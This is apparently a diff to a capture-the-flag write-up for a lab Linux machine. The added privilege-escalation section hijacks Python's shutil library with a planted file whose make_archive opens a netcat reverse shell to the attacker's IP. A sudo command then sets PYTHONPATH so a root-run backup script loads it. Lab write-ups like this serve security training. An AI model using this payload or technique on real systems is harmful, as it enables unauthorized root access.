@@ -2,6 +2,10 @@
 
 ```CSS
 Machine IP: 10.10.10.187 - Linux
+
+Vulnerabilities:
+- Adminer
+- Python Library Hijacking
 ```
 
 # Reconaissance
@@ -145,6 +149,26 @@ Nmap done: 1 IP address (1 host up) scanned in 11.59 seconds
 ---
 
 ## Privilege Escalation
-- Check for commands user `waldo` can run with `sudo` privileges.
+  - Check for commands user `waldo` can run with `sudo` privileges.
 ![image](https://user-images.githubusercontent.com/83878909/229505608-c3ef4196-8607-4701-ae8c-ebdc738e01f7.png)
 
+  - Found a python script `backup.py` which used a library `shutil`.
+![image](https://user-images.githubusercontent.com/83878909/229525273-91529626-73d5-48f5-8212-2100ecf7b411.png)
+
+  - The library can be hijacked by creating a malicious library which contains a reverse shell payload. Then create a python path variable to make python read the malicious library from a desired location instead of the original library from its default location.
+    - `cd /dev/shm/`
+    - `vi shutil.py`
+```CSS
+import os
+import socket
+import subprocess
+
+def make_archive(a, b, c):
+	os.system("nc -c /bin/bash 10.10.14.34 9001")
+```
+  - Path Variable: `PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh`
+  - Execute `admin_tasks.sh`: `sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh` 
+![image](https://user-images.githubusercontent.com/83878909/229532359-cb9e382b-39e4-415f-82df-a219b48fc510.png)
+
+## Root
+![image](https://user-images.githubusercontent.com/83878909/229532625-f3016ed2-f7c2-4869-ae31-7407ffa268df.png)
